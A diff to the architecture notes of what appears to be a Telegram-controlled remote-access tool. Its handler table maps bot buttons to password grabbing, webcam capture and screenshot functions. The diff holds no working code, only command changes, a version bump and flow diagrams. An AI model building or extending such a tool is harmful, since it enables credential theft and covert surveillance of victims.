@@ -1,7 +1,7 @@
 # 📊 ARCHITECTURE & LOGIC FLOW - V10 REFACTORED
 
 > **Developer:** TsByin  
-> **Version:** 2.0 (Refactored & Optimized)
+> **Version:** 10.0 (Refactored & Optimized)
 
 ## **I. CẤU TRÚC FILE & MODULE**
 
@@ -91,7 +91,7 @@
 
 ```
 ┌────────────────────────────────────────┐
-│  Telegram → /menu 1                    │
+│  Telegram → /start or /menu            │
 └─────────────┬──────────────────────────┘
               │
               ▼
@@ -112,7 +112,7 @@
 ┌────────────────────────────────────────┐
 │ send_reply_menu() creates keyboard     │
 │ ├─ ReplyKeyboardMarkup(row_width=2)    │
-│ ├─ Add buttons: 🔑 🌐 🖼 📸...         │
+│ ├─ Add buttons: 🔑 🌐 🖼 📸...        │
 │ └─ bot.send_message(m.chat.id, ...)    │
 └─────────────┬──────────────────────────┘
               │
@@ -430,7 +430,7 @@ V10.py (Main)
 ```
 USER ACTION           →  HANDLER              →  MODULE
 ─────────────────────────────────────────────────────────────
-/menu 1              →  menu_handler()       →  (create menu)
+/start or /menu      →  menu_handler()       →  (display menu)
 🔑 Passwords         →  h_pass()             →  grabber.grab_passwords()
 📸 Webcam            →  h_cam()              →  media.capture_webcam()
 🖼 Screenshot        →  h_scr()              →  media.smart_screenshot()
